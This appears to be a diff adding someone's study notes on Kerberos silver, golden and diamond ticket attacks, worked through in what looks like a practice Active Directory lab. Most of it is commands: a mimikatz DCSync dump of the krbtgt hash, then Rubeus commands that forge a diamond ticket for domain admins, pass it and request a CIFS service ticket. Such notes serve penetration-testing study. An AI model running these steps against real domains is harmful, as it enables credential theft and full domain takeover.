@@ -1,0 +1,33 @@
+silver, diamond, golden ticket
+
+silver ticket
+  I can forge a tgs for any user to any service on that machine
+golden ticket
+  I am forging tgt and not tgs
+diamond ticket is similar to golden but with evasion
+
+diamond ticket will request tgt, then update it and decrypt it and then update information then encrypt it with using krd account hashing
+
+I have session as robb.stark, I want to generate golden ticket
+get krb tgt account hash
+  usemodule powershell_credentials_mimikatz_dcsync
+  set user krbtgt
+  execute // got not unique
+  set user NORTRH\krbtgt
+  execute
+
+  aes256_hmac // copy this
+
+as robb.stark
+open powershell
+  cd C:\Users/Desktop\Ghoastpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master
+  .\Rubeus.exe diamond /tgtdeleg ticketuser:administrator /ticketuserid:1122 /groups:512 /krbkey: [key] nowrap // sid of domain admins ends with 512
+    -ticket userid domain rid // ObjectId // 1122 is last characters from ObjectId
+    -now I get back diamond ticket
+  now you can use this ticket with user who don't have access
+  .\Rubeus.exe ptt /ticket:[ticket]
+
+  x: .\Rubeus.exe asktgs /ticket:[ticket] /service:cifs/winterfell
+  sc.exe \\winterfell.north.sevenkingdoms.local query lanmanserver // request access for resource
+
+trust
